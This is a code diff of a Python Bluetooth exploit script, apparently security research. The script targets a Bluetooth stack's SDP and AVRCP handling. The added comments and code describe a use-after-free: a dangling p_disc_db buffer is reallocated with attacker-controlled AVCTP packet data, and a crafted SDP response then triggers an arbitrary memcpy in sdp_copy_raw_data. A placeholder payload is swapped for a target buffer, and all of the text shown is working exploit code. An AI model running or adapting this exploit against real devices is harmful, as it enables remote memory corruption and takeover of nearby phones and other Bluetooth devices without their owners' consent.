@@ -125,7 +125,8 @@ async def main():
                     error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
                 ))
             await asyncio.sleep(0.5)
-            # with 0xef as my filler:
+            # now p_disc_db is dangling: realloc it using avct_lcb_msg_asmbl
+            # we don't control the first 0x13 bytes; with 0xef as my filler:
             # 0000  00 00 02 01 0b 01 01 00 19 00 07 01 03 01 75 00   ..............u.
             # 0010  06 06 41 ef ef ef ef ef ef ef ef ef ef ef ef ef   ..A.............
             buf_offset = 0x13
@@ -137,8 +138,11 @@ async def main():
             avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
                 AvctMakePacket(0, avrcp.Protocol.PacketType.START, False,
                                False, 0x4141, avrcp_command_buf))
-            sdp_attribute_list = bytes(sdp.DataElement.sequence([b"A" * 0x100
-                                                                 ]))
+
+            # now p_disc_db is overwritten with our avrcp packet
+            # send sdp response, and sdp_copy_raw_data will do arbitrary memcpy
+            sdp_attribute_list = bytes(
+                sdp.DataElement.sequence([target_buffer]))
             device.sdp_server.send_response(
                 sdp.SDP_ServiceSearchAttributeResponse(
                     transaction_id=requests[1].transaction_id,
@@ -146,6 +150,7 @@ async def main():
                     attribute_lists=sdp_attribute_list,
                     continuation_state=bytes([0])))
             await asyncio.sleep(0.5)
+            # clean up: free avrcp packet, close rfcomm channel
             avrcp_protocol.avctp_protocol.send_response(0, 0x4141, b"A")
             await channel.disconnect()
             await asyncio.sleep(0.5)
